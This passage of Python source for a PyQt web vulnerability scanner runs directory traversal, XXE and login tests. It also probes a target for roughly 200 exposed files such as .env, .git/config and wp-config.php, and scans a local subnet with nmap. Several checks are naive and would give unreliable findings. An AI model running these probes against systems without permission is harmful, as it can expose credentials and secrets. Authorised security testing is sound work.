            log(f"[ERROR] Error reading the payload file: {e}", "error")
            return
    
        log("The Directory Traversal test begins...", "info")
    
        def test_payload(payload):
            payload = payload.strip()
            
            if not payload:
                return
    
            try:
                response = requests.get(target_url, params={"file": payload}, timeout=10)
    
                if response.status_code != 200:
                    log(f"[WARNING] Invalid response status for the payload '{payload}': {response.status_code}", "warning")
                    return
    
                if "root" in response.text:
                    log(f"[SUCCESS] Directory Traversal vulnerability found with a payload: {payload}", "success")
                else:
                    log(f"[INFO] Directory Traversal vulnerability not found with the payload: {payload}", "info")
    
            except requests.Timeout:
                log(f"[ERROR] The request has expired in time for the upload '{payload}'.", "error")
            except requests.ConnectionError:
                log(f"[ERROR] Error connecting to the server for the upload '{payload}'.", "error")
            except requests.RequestException as e:
                log(f"[ERROR] Request error for the upload '{payload}': {e}", "error")
            except Exception as e:
                log(f"[ERROR] Unknown error for the payload '{payload}': {e}", "error")
    
        threads = []
        for payload in payloads:
            thread = threading.Thread(target=test_payload, args=(payload,))
            threads.append(thread)
            thread.start()
    
        for thread in threads:
            thread.join()
    
        log("[INFO] The Directory Traversal test is completed for all payloads.", "info")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"Directory_Traversal_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "Directory Traversal Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50:  
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()

    
    def security_misconfiguration_test(self):
        target_url = self.get_target_url()
        self.log("The Security Misconfiguration test begins...", "info")
        
        potential_files = [
            "/.env", "/config.php", "/.git/config", "/.svn/entries", "/debug.php", "/test.php", 
            "/phpinfo.php", "/setup.php", "/install.php", "/readme.txt", "/license.txt", "/config.yml", 
            "/wp-config.php", "/robots.txt", "/backup.tar", "/backup.zip", "/database.sql", "/.idea", 
            "/.vscode", "/.DS_Store", "/.gitmodules", "/.travis.yml", "/.gitattributes", "/.htaccess", 
            "/.gitignore", "/node_modules", "/public/.env", "/public/config.php", "/tmp/.env", "/tmp/config.php",
            "/var/.env", "/var/config.php", "/.well-known/acme-challenge", "/private/.env", "/private/config.php",
            "/assets/.env", "/assets/config.php", "/.docker", "/.heroku", "/build/.env", "/build/config.php", 
            "/bin/.env", "/bin/config.php", "/app/.env", "/app/config.php", "/composer.json", "/composer.lock", 
            "/webpack.config.js", "/package.json", "/config/database.yml", "/config/settings.py", "/settings.json", 
            "/config/local.xml", "/config/secrets.yml", "/config/config.php", "/.env.local", "/.env.example", 
            "/server.js", "/Dockerfile", "/nginx.conf", "/var/www/html/.env", "/var/www/html/config.php", 
            "/server/config.php", "/server/.env", "/public_html/.env", "/public_html/config.php", "/private/.git/config", 
            "/private/.svn/entries", "/private/.idea", "/var/www/.env", "/var/www/config.php", "/var/.git", "/var/.gitmodules",
            "/var/.svn", "/var/.hg", "/.git/HEAD", "/.git/hooks", "/.git/refs", "/.git/objects", "/.git/packed-refs", 
            "/.svn/entries", "/.svn/lock", "/.svn/tmp", "/.svn/wc.db", "/private/.git", "/private/.hg", "/private/.svn", 
            "/private/.travis.yml", "/public/.git", "/public/.svn", "/public/.hg", "/tmp/.git", "/tmp/.svn", "/tmp/.hg", 
            "/tmp/.gitignore", "/tmp/.env", "/tmp/config.php", "/tmp/.htaccess", "/tmp/.gitmodules", "/tmp/.gitattributes", 
            "/tmp/.docker", "/tmp/.heroku", "/var/.gitconfig", "/var/.gitignore", "/var/.dockerignore", "/var/.npmrc", 
            "/var/.composer", "/var/.yarnrc", "/var/.babelrc", "/var/.eslintignore", "/var/.editorconfig", "/var/.env.test", 
            "/var/.env.production", "/build/.git", "/build/.env", "/build/config.php", "/build/.env.sample", "/build/.env.example", 
            "/bin/.git", "/bin/.svn", "/bin/.env", "/bin/config.php", "/bin/.htaccess", "/bin/.env.sample", "/bin/.env.example", 
            "/assets/.git", "/assets/.svn", "/assets/.env", "/assets/config.php", "/assets/.htaccess", "/assets/.gitignore",
            "/public_html/.gitconfig", "/public_html/.gitignore", "/public_html/.gitmodules", "/public_html/.dockerignore",
            "/public_html/.npmrc", "/public_html/.yarnrc", "/public_html/.babelrc", "/public_html/.editorconfig",
            "/private/.git/HEAD", "/private/.git/refs", "/private/.git/objects", "/private/.git/packed-refs", "/private/.git/hooks",
            "/private/.gitignore", "/private/.gitmodules", "/private/.travis.yml", "/private/.dockerignore", "/private/.env.prod",
            "/private/.env.staging", "/private/.env.development", "/private/.env.testing", "/public/.env.prod", "/public/.env.dev", 
            "/public/.env.staging", "/public/.env.local", "/public/.env.testing", "/private/.htaccess", "/public/.htaccess", 
            "/var/.npmrc", "/var/.yarnrc", "/var/.babelrc", "/var/.eslintignore", "/var/.editorconfig", "/var/.dockerignore", 
            "/var/.gitconfig", "/var/.gitmodules", "/var/.gitignore", "/var/.travis.yml", "/var/.composer", "/var/.webpack.config", 
            "/var/.gitattributes", "/var/.gitlab-ci.yml", "/var/.circleci/config.yml", "/var/.vscode/settings.json", 
            "/var/.env.sample", "/var/.env.example", "/var/.env.prod", "/var/.env.development", "/var/.env.testing", 
            "/bin/.npmrc", "/bin/.yarnrc", "/bin/.babelrc", "/bin/.eslintignore", "/bin/.editorconfig", "/bin/.env.local", 
            "/bin/.env.prod", "/bin/.env.staging", "/bin/.env.development", "/bin/.env.testing", "/assets/.gitconfig", 
            "/assets/.gitmodules", "/assets/.travis.yml", "/assets/.dockerignore"
        ]
        
        found_vulnerabilities = []
        log_entries = []  
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        def check_file(file):
            try:
                response = requests.get(urljoin(target_url, file), timeout=10)
                if response.status_code == 200:
                    log(f"[SUCCESS] Security Misconfiguration vulnerability found on {file}!", "success")
                    found_vulnerabilities.append(file)
                else:
                    log(f"[INFO] The {file} file does not contain a vulnerability.", "info")
            except requests.RequestException as e:
                log(f"[ERROR] Error during verification {file}: {str(e)}", "error")
            except Exception as e:
                log(f"[ERROR] Unknown error during verification {file}: {str(e)}", "error")
    
        threads = []
        for file in potential_files:
            thread = threading.Thread(target=check_file, args=(file,))
            threads.append(thread)
            thread.start()
    
        for thread in threads:
            thread.join()
    
        if found_vulnerabilities:
            log(f"[WARNING] Vulnerabilities found: {', '.join(found_vulnerabilities)}", "warning")
        else:
            log("[INFO] Security Misconfiguration vulnerabilities not found.", "info")
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"Security_Misconfiguration_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "Security Misconfiguration Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50: 
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()

    def broken_authentication_test(self):
        target_url = self.get_target_url()
        username = self.get_username()
        password = self.get_password()
        payload = {"username": username, "password": password}
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }
    
        log_entries = []  
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        log("The Broken Authentication test begins...", "info")
    
        def test_authentication():
            with requests.Session() as session:
                retry_attempts = 3
                for attempt in range(retry_attempts):
                    try:
                        response = session.post(target_url, data=payload, headers=headers, timeout=10)
    
                        if response.status_code == 200:
                            log("[SUCCESS] Broken Authentication vulnerability found! The answer is 200", "success")
                            return
                        elif response.status_code == 401:
                            log("[INFO] Code 401 was received, possibly an authentication error.", "info")
                            return
                        elif response.status_code == 403:
                            log("[INFO] Code 403 was received, access is denied — there may be an error in authentication.", "info")
                            return
                        else:
                            log(f"[INFO] Response with the code {response.status_code}: The Broken Authentication vulnerability was not found.", "info")
    
                    except requests.exceptions.Timeout:
                        log("[ERROR] The request timeout has expired. I'll try again...", "error")
                    except requests.exceptions.RequestException as e:
                        log(f"[ERROR] Request error: {e}. I'll try again...", "error")
    
                    time.sleep(2)
    
                log("[INFO] The test is completed, the vulnerability has not been found.", "info")
    
        threads = []
        for i in range(3):  
            thread = threading.Thread(target=test_authentication)
            threads.append(thread)
            thread.start()
    
        for thread in threads:
            thread.join()
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"BrokenAuth_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "Broken Authentication Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50: 
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()
    
    def sensitive_data_exposure_test(self):
        target_url = self.get_target_url()
        self.log("The Sensitive Data Exposure test begins...", "info")
    
        log_entries = []  
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        sensitive_patterns = [
            r'\b(?:\d{16}|\d{4}-\d{4}-\d{4}-\d{4})\b',
            r'\b(?:\d{3}-\d{2}-\d{4})\b',
            r'\b(?:\d{4} \d{4} \d{4} \d{4})\b',
            r'\b[A-Za-z0-9]{32}\b',
            r'\b(?:password|secret|key|token)\b',
            r'\b(?:username|login|user|email|phone|address)\b',
            r'\b(?:\d{15,16})\b',
            r'\b(?:\d{3} \d{3} \d{3} \d{3})\b',
            r'\b(?:\d{4}-\d{4}-\d{4}-\d{4}-\d{4})\b',
            r'\b(?:\d{4} \d{4} \d{4} \d{4} \d{4})\b',
            r'\b(?:api|apikey|access|auth|token|bearer|private|client)\b',
            r'\b(?:AWS|Azure|GCP|Google|cloud|api|secret|key|service)\b',
            r'\b(?:CREDIT|CARD|NUMBER|DEBIT|PIN)\b',
            r'\b(?:facebook|twitter|instagram|linkedin|snapchat)\b',
            r'\b(?:password123|letmein|qwerty|123456)\b',
            r'\b(?:ssn|social security number)\b',
            r'\b(?:tax|vat|eid|ein|pan|passport)\b',
            r'\b(?:bank|account|routing|iban)\b',
            r'\b(?:driver\s?license|license\s?number)\b',
            r'\b(?:credit\s?score|balance|limit)\b',
            r'\b(?:dob|date\s?of\s?birth)\b',
            r'\b(?:cvv|cvc|security\s?code)\b',
            r'\b(?:zip\s?code|postal\s?code)\b',
            r'\b(?:home\s?address|shipping\s?address)\b',
            r'\b(?:phone\s?number|mobile\s?number|cell\s?phone)\b',
            r'\b(?:email\s?address|email\s?id)\b',
            r'\b(?:ip\s?address|ipv4|ipv6)\b',
            r'\b(?:mac\s?address)\b',
            r'\b(?:public\s?key|private\s?key|ssl|ssh)\b',
            r'\b(?:ssh\s?key|pem\s?file)\b',
            r'\b(?:certificate|crt|pfx|keystore|chain)\b',
            r'\b(?:biometric|fingerprint|retina|iris|face)\b',
            r'\b(?:health\s?insurance\s?number|hipaa|medicare)\b',
            r'\b(?:social\s?security)\b',
            r'\b(?:cloud\s?storage|dropbox|one\s?drive|google\s?drive|onedrive)\b',
            r'\b(?:backup\s?key|restore\s?key)\b',
            r'\b(?:account\s?number|account\s?balance)\b',
            r'\b(?:bank\s?account|credit\s?card)\b',
            r'\b(?:passport|driver\s?license|visa|immigration|id\s?card)\b',
            r'\b(?:pin\s?code|password\s?hint)\b',
            r'\b(?:mfa|two\s?factor\s?authentication)\b',
            r'\b(?:security\s?question|answer)\b',
            r'\b(?:api\s?endpoint|web\s?hook)\b',
            r'\b(?:jwt|json\s?web\s?token)\b',
            r'\b(?:oauth|authorization\s?code)\b',
            r'\b(?:access\s?token|refresh\s?token)\b',
            r'\b(?:private\s?data|sensitive\s?information)\b',
            r'\b(?:authentication\s?token)\b',
            r'\b(?:private\s?key|secret\s?key)\b',
            r'\b(?:db\s?password|database\s?password)\b',
            r'\b(?:api\s?secret|client\s?secret)\b',
            r'\b(?:client\s?id|client\s?secret)\b',
            r'\b(?:login\s?credentials)\b',
            r'\b(?:personal\s?identification\s?number)\b',
            r'\b(?:biometric\s?data)\b',
            r'\b(?:credit\s?card\s?holder)\b',
            r'\b(?:zip\s?codes|postal\s?codes)\b',
            r'\b(?:login\s?password|security\s?token|session\s?id)\b',
            r'\b(?:encrypted\s?key|decryption\s?key|encryption\s?algorithm)\b',
            r'\b(?:contract\s?number|agreement\s?id)\b',
            r'\b(?:bank\s?details|account\s?number|bank\s?name)\b',
            r'\b(?:medical\s?records|hospital\s?number)\b',
            r'\b(?:network\s?key|wifi\s?password|ssid)\b',
            r'\b(?:IP\s?subnet|gateway\s?address)\b',
            r'\b(?:device\s?token|device\s?id|fingerprint)\b',
            r'\b(?:admin\s?password|root\s?password|service\s?password)\b',
            r'\b(?:full\s?name|address\s?line|city\s?name)\b',
            r'\b(?:internal\s?ip|external\s?ip)\b',
            r'\b(?:file\s?path|system\s?path|directory\s?location)\b',
            r'\b(?:access\s?credentials|system\s?access)\b',
            r'\b(?:contact\s?information|personal\s?details)\b',
            r'\b(?:legal\s?name|date\s?of\s?birth|marital\s?status)\b',
            r'\b(?:tax\s?payer\s?id|tax\s?filing\s?status)\b',
            r'\b(?:utility\s?bill|electric\s?bill|water\s?bill)\b',
            r'\b(?:bank\s?routing\s?number|swift\s?code)\b',
            r'\b(?:emergency\s?contact|primary\s?care\s?physician)\b',
            r'\b(?:passport\s?expiry\s?date|visa\s?expiry\s?date)\b',
            r'\b(?:emergency\s?phone\s?number|contact\s?person)\b',
            r'\b(?:preferred\s?contact\s?method|communication\s?preferences)\b',
            r'\b(?:loan\s?number|loan\s?agreement)\b',
            r'\b(?:student\s?id|university\s?id|student\s?loan)\b',
            r'\b(?:research\s?data|clinical\s?trial\s?data)\b',
            r'\b(?:insurance\s?policy|insurance\s?id)\b',
            r'\b(?:security\s?question\s?answer|password\s?hint)\b',
            r'\b(?:bank\s?statement|balance\s?statement)\b',
            r'\b(?:personal\s?identifiers|verification\s?details)\b',
            r'\b(?:emergency\s?response\s?plan|evacuation\s?plan)\b'
        ]
    
        try:
            response = requests.get(target_url, timeout=10)
            response.raise_for_status()
    
            if response.status_code == 200:
                for pattern in sensitive_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        log("[SUCCESS] Sensitive Data Exposure vulnerability found!", "success")
                        break
                else:
                    log("[INFO] The vulnerability of Sensitive Data Exposure was not found.", "info")
            else:
                log(f"[WARNING] An unexpected status code was received {response.status_code}.", "warning")
    
        except requests.exceptions.RequestException as e:
            log(f"[ERROR] Request error: {e}", "error")
        except Exception as e:
            log(f"[ERROR] Unknown error: {e}", "error")
    
        def generate_pdf_report(log_entries):
            current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            report_file = f"sensitive_data_exposure_report_{current_time}.pdf"
            c = canvas.Canvas(report_file, pagesize=letter)
            c.setFont("Helvetica", 10)
    
            y_position = 750
            c.drawString(30, y_position, f"Sensitive Data Exposure Test Report ({current_time})")
            y_position -= 20
            for level, message in log_entries:
                c.setFont("Helvetica", 8)
                if level == "success":
                    c.setFillColorRGB(0, 1, 0) 
                elif level == "warning":
                    c.setFillColorRGB(1, 1, 0)  
                elif level == "error":
                    c.setFillColorRGB(1, 0, 0)  
                else:
                    c.setFillColorRGB(0, 0, 0) 
    
                c.drawString(30, y_position, f"[{level.upper()}] {message}")
                y_position -= 15
    
                if y_position < 50:
                    c.showPage()  
                    y_position = 750
    
            c.save()
    
        generate_pdf_report(log_entries)

    def xx_injection_test(self):
        target_url = self.get_target_url()
        payloads_path = os.path.join("program_files", "payloads", "XX.txt")
        
        log_entries = [] 
    
        def log(message, level="info"):
            log_entries.append((level, message))
            self.log(message, level)
    
        if not os.path.exists(payloads_path):
            log(f"[ERROR] The payload file was not found: {payloads_path}", "error")
            return
    
        try:
            with open(payloads_path, "r", encoding="utf-8") as f:
                raw_payloads = f.read()
        except Exception as e:
            log(f"[ERROR] The file could not be read: {e}", "error")
            return
    
        payload_blocks = [block.strip() for block in raw_payloads.split("```") if block.strip()]
    
        if not payload_blocks:
            log("[WARNING] The payload file is empty or incorrectly formed.", "warning")
            return
    
        log(f"[INFO] Uploaded {len(payload_blocks)} payloads for testing.", "info")
    
        def test_payload(index, payload):
            log(f"[INFO] Testing the payload #{index + 1}...", "info")
            try:
                response = requests.post(target_url, data={"xml": payload}, timeout=10)
    
                if response.status_code != 200:
                    log(f"[WARNING] Payload #{index + 1}: unexpected response status {response.status_code}", "warning")
                    return
    
                if "root" in response.text or "success" in response.text.lower():
                    log(f"[SUCCESS] Payload #{index + 1}: XXE Injection vulnerability found!", "success")
                else:
                    log(f"[INFO] Payload #{index + 1}: attachment XXE Injection not found.", "info")
    
            except requests.exceptions.Timeout:
                log(f"[ERROR] Payload #{index + 1}: Request timeout exceeded.", "error")
            except requests.exceptions.RequestException as e:
                log(f"[ERROR] Payload #{index + 1}: request error: {e}", "error")
            except Exception as e:
                log(f"[ERROR] Payload #{index + 1}: unexpected error: {e}", "error")
    
        threads = []
        for index, payload in enumerate(payload_blocks):
            thread = threading.Thread(target=test_payload, args=(index, payload))
            threads.append(thread)
            thread.start()
    
        for thread in threads:
            thread.join()
    
        def generate_pdf_report():
            report_path = os.path.join("reports", f"XXE_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf")
            os.makedirs(os.path.dirname(report_path), exist_ok=True)
    
            c = canvas.Canvas(report_path, pagesize=letter)
            c.setFont("Helvetica", 12)
            c.drawString(50, 750, "XXE Injection Test Report")
            c.drawString(50, 735, f"Target URL: {target_url}")
            c.drawString(50, 720, f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            c.drawString(50, 705, "-" * 70)
    
            y = 690
            for level, message in log_entries:
                if y < 50:  
                    c.showPage()
                    c.setFont("Helvetica", 12)
                    y = 750
                c.setFont("Helvetica-Bold" if level == "success" else "Helvetica", 10)
                c.drawString(50, y, message)
                y -= 15
    
            c.save()
            log(f"[INFO] The report is saved in {report_path}", "info")
    
        generate_pdf_report()
    
    def scan_network(self):
        self.log("The network scan begins...", "info")
    
        try:
            import nmap
            nm = nmap.PortScanner()
    
            nm.scan(hosts='192.168.1.0/24', arguments='-p 80,443')
    
            hosts_scanned = nm.all_hosts()
            if not hosts_scanned:
                self.log("Scan completed: No hosts found.", "warning")
                return
    
            self.log(f"{len(hosts_scanned)} hosts found. The processing of the results begins...", "info")
    
            for host in hosts_scanned:
                state = nm[host].state()
                self.log(f"Host: {host} - State: {state}", "info")
    
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    ports_info = ', '.join(map(str, sorted(ports)))
                    self.log(f"  Protocol: {proto} - Ports: {ports_info}", "debug")
    
            self.log("The network scan was completed successfully.", "info")
    
        except nmap.PortScannerError as e:
            self.log(f"Nmap Scan Error: {e}", "error")
        except Exception as e:
            self.log(f"Unexpected error: {e}", "error")
    

class SettingsDialog(QDialog):
    def __init__(self, parent):
        super().__init__(parent)
        self.setWindowTitle("Settings")
        self.setFixedSize(300, 200)
        
        self.form_layout = QFormLayout()

        self.url_input = QLineEdit(parent.default_target_url)
        self.form_layout.addRow("Target URL:", self.url_input)

        self.ports_input = QLineEdit(parent.default_scan_ports)
        self.form_layout.addRow("Scan Ports:", self.ports_input)

        self.button_box = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        self.button_box.accepted.connect(self.accept)
        self.button_box.rejected.connect(self.reject)

        self.layout = QVBoxLayout()
        self.layout.addLayout(self.form_layout)
        self.layout.addWidget(self.button_box)
        self.setLayout(self.layout)

    def accept(self):
        target_url = self.url_input.text()
        scan_ports = self.ports_input.text()
        
        self.parent().set_target_url(target_url)
        self.parent().set_scan_ports(scan_ports)
        
        super().accept()
        
if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = SecurityTool()
    window.show()
    sys.exit(app.exec_())
